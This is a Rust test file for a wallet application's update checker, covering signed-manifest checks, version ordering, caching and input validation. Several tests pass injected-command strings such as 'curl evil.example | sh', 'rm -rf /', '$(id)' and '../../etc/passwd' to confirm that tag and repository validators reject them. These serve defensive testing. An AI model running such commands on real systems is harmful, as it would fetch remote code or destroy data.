//! Tests for [`super`].
//!
//! Out of line so the audit corpus is production code: V12 bills measured
//! bytes and excludes `*_test.rs` by default.

use super::*;

const REPOSITORY: &str = "EkuboProtocol/wallet";

#[test]
fn installable_updates_use_only_the_stable_release_manifest() {
    assert_eq!(
        UPDATE_MANIFEST_URL,
        "https://github.com/EkuboProtocol/wallet/releases/latest/download/latest.json"
    );
    assert!(!UPDATE_MANIFEST_URL.contains("prerelease"));
}

#[test]
fn updater_private_material_is_never_compiled_into_the_module() {
    let source = include_str!("release_check.rs");
    assert!(source.contains("UPDATER_PUBLIC_KEY"));
    assert!(!source.contains("UPDATER_PRIVATE_KEY"));
}

fn update_fixture(version: &str, url: &str) -> InstallableUpdate {
    InstallableUpdate {
        update: cargo_packager_updater::Update {
            config: cargo_packager_updater::Config::default(),
            body: None,
            current_version: "1.0.0".into(),
            version: version.into(),
            date: None,
            target: "linux".into(),
            extract_path: "wallet.AppImage".into(),
            download_url: url.parse().unwrap(),
            signature: "artifact-signature".into(),
            timeout: None,
            headers: cargo_packager_updater::http::HeaderMap::default(),
            format: cargo_packager_updater::UpdateFormat::AppImage,
        },
        artifact_sha256: "aa".repeat(32),
    }
}

fn manifest_fixture(version: &str, url: &str) -> Vec<u8> {
    let target = format!("linux-{}", std::env::consts::ARCH);
    serde_json::to_vec(&serde_json::json!({
        "version": version,
        "platforms": {
            (target): {
                "url": url,
                "signature": "artifact-signature",
                "sha256": "aa".repeat(32),
                "format": "appimage"
            }
        }
    }))
    .unwrap()
}

#[test]
fn signed_metadata_cannot_claim_a_new_version_while_selecting_an_old_artifact() {
    let new_url = "https://example.test/wallet-2.0.0.AppImage";
    let old = update_fixture("2.0.0", "https://example.test/wallet-1.0.0.AppImage");
    assert!(
        update_matches_signed_manifest(&old.update, &manifest_fixture("2.0.0", new_url)).is_err()
    );

    let valid = update_fixture("2.0.0", new_url);
    update_matches_signed_manifest(&valid.update, &manifest_fixture("2.0.0", new_url)).unwrap();

    assert!(
        update_matches_signed_manifest(&valid.update, &manifest_fixture("2.0.1", new_url)).is_err()
    );
}

#[test]
fn changing_any_signed_manifest_byte_invalidates_its_envelope() {
    let public_key = "RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3";
    let signature = "untrusted comment: signature from minisign secret key\n\
RUQf6LRCGA9i559r3g7V1qNyJDApGip8MfqcadIgT9CuhV3EMhHoN1mGTkUidF/z7SrlQgXdy8ofjb7bNJJylDOocrCo8KLzZwo=\n\
trusted comment: timestamp:1633700835\tfile:test\tprehashed\n\
wLMDjy9FLAuxZ3q4NlEvkgtyhrr0gtTu6KC4KBJdITbbOeAi1zBIYo0v4iTgt8jJpIidRJnp94ABQkJAgAooBQ==";
    verify_manifest_signature(b"test", signature, public_key).unwrap();
    assert!(verify_manifest_signature(b"Test", signature, public_key).is_err());
}

fn at(text: &str) -> DateTime<Utc> {
    text.parse().expect("a fixed timestamp")
}

/// The check with no network and a fixed clock. `fetch` is what the endpoint
/// would have answered.
async fn check_at(
    data_dir: &Path,
    installed: &str,
    now: DateTime<Utc>,
    fetch: Option<&str>,
) -> ReleaseCheck {
    let fetch = fetch.map(str::to_string);
    check_with(data_dir, installed, REPOSITORY, now, false, || async {
        fetch
    })
    .await
}

#[test]
fn a_published_release_supersedes_an_older_one() {
    assert_eq!(is_newer("1.4.2", "v1.5.0"), Some(true));
    assert_eq!(is_newer("1.4.2", "v1.4.3"), Some(true));
    assert_eq!(is_newer("1.4.2", "v2.0.0"), Some(true));
    assert_eq!(is_newer("1.4.2", "v1.4.2"), Some(false));
    assert_eq!(is_newer("1.5.0", "v1.4.2"), Some(false));
    // Shorter cores compare as if zero-padded, so `1.5` is not behind `1.5.0`.
    assert_eq!(is_newer("1.5", "v1.5.0"), Some(false));
    assert_eq!(is_newer("1.5", "v1.5.1"), Some(true));
}

#[test]
fn a_release_supersedes_a_prerelease_of_itself() {
    // The case that matters while `BUILD_VERSION` is an `-rc` build: the
    // numeric cores are equal and the running build is still behind.
    assert_eq!(is_newer("1.0.0-rc.0+8133a00", "v1.0.0"), Some(true));
    assert_eq!(is_newer("1.0.0-rc.0+8133a00", "v1.0.0-rc.0"), Some(false));
    assert_eq!(is_newer("1.0.0", "v1.0.0-rc.1"), Some(false));
}

#[test]
fn an_unparseable_version_is_unknown_rather_than_an_upgrade() {
    // Never `Some(true)`: an answer nobody can order must not become a
    // recommendation to install something.
    assert_eq!(is_newer("1.4.2", "nightly"), None);
    assert_eq!(is_newer("not-a-version", "v1.5.0"), None);
    assert_eq!(is_newer("1.4.2", ""), None);
}

#[test]
fn a_tag_that_could_escape_a_release_url_is_refused() {
    // A tag is only ever alphanumerics and version punctuation.
    assert!(!valid_tag("v1.0.0; curl evil.example | sh"));
    assert!(!valid_tag("v1.0.0 && rm -rf /"));
    assert!(!valid_tag("v1.0.0\nrm -rf /"));
    assert!(!valid_tag("$(id)"));
    assert!(!valid_tag("`id`"));
    assert!(!valid_tag("../../etc/passwd"));
    assert!(!valid_tag(""));
    assert!(!valid_tag(&"v1.0.0".repeat(20)));

    assert!(valid_tag("v1.0.0"));
    assert!(valid_tag("v1.0.0-rc.1"));
    assert!(valid_tag("1.0.0+8133a00"));
}

#[test]
fn a_repository_override_is_owner_and_name_only() {
    assert!(valid_repository("EkuboProtocol/wallet"));
    assert!(valid_repository("owner/name.with.dots"));

    assert!(!valid_repository("EkuboProtocol"));
    assert!(!valid_repository("owner/name/extra"));
    assert!(!valid_repository("owner/"));
    assert!(!valid_repository("/name"));
    assert!(!valid_repository("owner/name; id"));
    assert!(!valid_repository("../../../etc"));
}

#[tokio::test]
async fn an_available_update_directs_the_user_to_the_verified_updater() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    assert!(check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
    assert_eq!(check.source, CheckSource::Network);
    assert_eq!(
        check.release_url.as_deref(),
        Some("https://github.com/EkuboProtocol/wallet/releases/latest")
    );
    assert!(check.instruction.contains("Updates"));
    assert!(check.instruction.contains("download, verify, and install"));
    assert!(check.notice().is_some());
}

#[tokio::test]
async fn a_current_build_offers_no_notice() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(
        directory.path(),
        "1.5.0",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    assert!(!check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
    assert!(check.notice().is_none());
}

#[tokio::test]
async fn a_malicious_tag_is_discarded_rather_than_interpolated() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0; curl evil.example | sh"),
    )
    .await;

    assert!(!check.update_available);
    assert!(check.latest_version.is_none());
    // And nothing about it was written down for the next call to trust.
    assert!(!directory.path().join(CACHE_FILE).exists());
}

#[tokio::test]
async fn a_fresh_cache_answers_without_asking_the_endpoint() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let first = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;
    assert_eq!(first.source, CheckSource::Network);

    // An hour later, with an endpoint that would panic if it were consulted.
    let second = check_with(
        directory.path(),
        "1.4.2",
        REPOSITORY,
        at("2026-08-08T01:00:00Z"),
        false,
        || async { panic!("the endpoint must not be asked inside the cache window") },
    )
    .await;

    assert_eq!(second.source, CheckSource::Cache);
    assert_eq!(second.latest_version.as_deref(), Some("v1.5.0"));
    assert_eq!(second.checked_at, Some(at("2026-08-08T00:00:00Z")));
}

#[tokio::test]
async fn a_stale_cache_is_refreshed() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    let later = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-09T00:00:01Z"),
        Some("v1.6.0"),
    )
    .await;

    assert_eq!(later.source, CheckSource::Network);
    assert_eq!(later.latest_version.as_deref(), Some("v1.6.0"));
}

#[tokio::test]
async fn a_cache_dated_in_the_future_is_stale_rather_than_permanent() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    // The clock moved backwards. Without the lower bound this cache would
    // never expire.
    let earlier = check_at(
        directory.path(),
        "1.4.2",
        at("2026-01-01T00:00:00Z"),
        Some("v1.6.0"),
    )
    .await;

    assert_eq!(earlier.source, CheckSource::Network);
    assert_eq!(earlier.latest_version.as_deref(), Some("v1.6.0"));
}

#[tokio::test]
async fn a_cache_from_another_repository_is_not_reused() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v3.1.3"),
    )
    .await;

    // Same day, same cache file, different repository. Reusing the tag here
    // would name a release URL for a tag the other
    // repository never published.
    let elsewhere = check_with(
        directory.path(),
        "1.4.2",
        "someone/fork",
        at("2026-08-08T01:00:00Z"),
        false,
        || async { Some("v1.5.0".to_string()) },
    )
    .await;

    assert_eq!(elsewhere.source, CheckSource::Network);
    assert_eq!(elsewhere.latest_version.as_deref(), Some("v1.5.0"));
    assert_eq!(
        elsewhere.release_url.as_deref(),
        Some("https://github.com/someone/fork/releases/latest")
    );
    assert_eq!(
        elsewhere.release_url.as_deref(),
        Some("https://github.com/someone/fork/releases/latest")
    );
}

#[tokio::test]
async fn an_unreachable_endpoint_falls_back_to_a_stale_answer() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    // Offline, a week later. The named release was still published, and the
    // only thing its age can cause is failing to mention a newer one.
    let offline = check_at(directory.path(), "1.4.2", at("2026-08-15T00:00:00Z"), None).await;

    assert_eq!(offline.source, CheckSource::Cache);
    assert!(offline.update_available);
    assert_eq!(offline.checked_at, Some(at("2026-08-08T00:00:00Z")));
}

#[tokio::test]
async fn being_offline_with_nothing_cached_is_not_an_error() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(directory.path(), "1.4.2", at("2026-08-08T00:00:00Z"), None).await;

    assert_eq!(check.source, CheckSource::Unavailable);
    assert!(!check.update_available);
    assert!(check.latest_version.is_none());
    assert!(check.notice().is_none());
    // The agent is told explicitly not to read this as a reason to upgrade.
    assert!(check.instruction.contains("Do not retry"));
}

#[tokio::test]
async fn the_environment_can_turn_the_check_off_entirely() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_with(
        directory.path(),
        "1.4.2",
        REPOSITORY,
        at("2026-08-08T00:00:00Z"),
        true,
        || async { panic!("a disabled check must not reach the endpoint") },
    )
    .await;

    assert_eq!(check.source, CheckSource::Disabled);
    assert!(!check.update_available);
    assert!(check.notice().is_none());
}

#[tokio::test]
async fn an_unwritable_data_directory_still_answers() {
    // The cache is an optimisation. Losing it costs a request next time and
    // must not cost the answer this time.
    let check = check_at(
        Path::new("/nonexistent/ekubo-wallet-release-check"),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    assert!(check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
}

mod bounded_body_tests {
    //! `content_length` is a courtesy the server extends, not a fact.

    /// The header check refuses the honest oversized case before a byte is
    /// read, which is worth keeping. It says nothing about a server that omits
    /// the header -- chunked encoding does -- or states one length and sends
    /// another, and `text()` then buffered whatever arrived.
    ///
    /// Read from the source because standing up a lying HTTP server for a
    /// best-effort update check is a great deal of machinery for one loop.
    /// What is checkable is that the body is accumulated against the ceiling
    /// rather than handed to `text()`.
    #[test]
    fn the_body_is_read_against_the_ceiling_rather_than_buffered() {
        let source = include_str!("release_check.rs");
        let fetch = source
            .split_once("async fn fetch_latest_tag")
            .expect("the fetch exists")
            .1;
        let body = fetch.split_once("\n}").expect("its body ends").0;
        assert!(
            !body.contains(".text().await"),
            "an unbounded read is what this replaced"
        );
        assert!(
            body.contains("bounded_body(response)"),
            "the body goes through the ceiling"
        );

        let bounded = source
            .split_once("async fn bounded_body")
            .expect("the helper exists")
            .1;
        assert!(
            bounded.contains("MAX_RESPONSE_BYTES"),
            "and the ceiling is the one already declared for this"
        );
        assert!(
            bounded.contains("return None"),
            "an oversized body is abandoned rather than truncated: a partial \
             JSON document is not a release"
        );
    }
}
